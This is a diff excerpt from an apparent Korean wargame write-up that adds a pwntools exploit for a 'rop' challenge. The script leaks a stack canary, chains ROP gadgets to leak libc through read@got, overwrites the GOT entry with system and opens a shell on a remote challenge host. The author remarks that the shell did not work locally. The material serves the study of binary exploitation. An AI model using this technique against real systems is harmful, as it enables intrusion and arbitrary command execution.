@@ -82,9 +82,72 @@ read@got를 덮어쓰기 위해 read@plt를 호출할텐데, 인자로 값을 �
 <br>
 
 ```python
+from pwn import *
 
+#p = process('./rop')
+
+p = remote("host3.dreamhack.games", 14169)
+
+
+payload = b"A"*(0x40-0x7)
+p.sendafter(b'Buf: ',payload)
+p.recvuntil(payload)
+
+canary = u64(b"\x00"+p.recvn(7))
+print("@ Canary : ",hex(canary))
+
+libc = ELF('./libc-2.27.so')
+e = ELF('./rop')
+
+pop_rdi_ret = 0x00000000004007f3
+pop_rsi_r15_ret = 0x00000000004007f1
+#pop_rdx_ret = 0x0000000000001b96 --> libc gadget
+#ret = 0x000000000040055e
+puts_plt = e.plt['puts']
+read_plt = e.plt['read']
+read_got = e.got['read']
+binsh = read_got + 0x8
+
+# payload
+# buffer padding + canary + sfp + puts(read@got) + read(0,read@got,?) + read@plt
+
+payload = b"A"*(0x40-0x8) + p64(canary) + b"B"*0x8
+
+# puts(read@got)
+payload += p64(pop_rdi_ret) # return to pop_rdi
+payload += p64(read_got) # 인자로 read@got 주소
+payload += p64(puts_plt) # call puts@plt
+
+# read(0,read@got,)
+payload += p64(pop_rdi_ret)
+payload += p64(0) # read(0,)
+payload += p64(pop_rsi_r15_ret)
+payload += p64(read_got) # read(0,read@got,)
+payload += p64(0) # r15 = 0
+#payload += p64(pop_rdx_ret)
+#payload += p64(200)
+payload += p64(read_plt) # call read@plt
+
+# call read --> system
+payload += p64(pop_rdi_ret)
+payload += p64(binsh)
+payload += p64(read_plt) # call read@plt
+
+p.sendafter(b'Buf: ', payload)
+
+read_addr = u64(p.recvn(6)+b"\x00"*2)
+libc_base = read_addr - libc.symbols['read']
+system_addr = libc_base + libc.symbols['system']
+
+print("@ libc_base :", hex(libc_base))
+print("@ system_addr :",hex(system_addr))
+
+p.send(p64(system_addr)+b"/bin/sh\x00") # read를 통해 got overwrite
+
+p.interactive()
 ```
 
+로컬에서 할 때는 셸이 흭득이 안됬는데.. 흠.. 이유를 모르겠다.
 
 
 
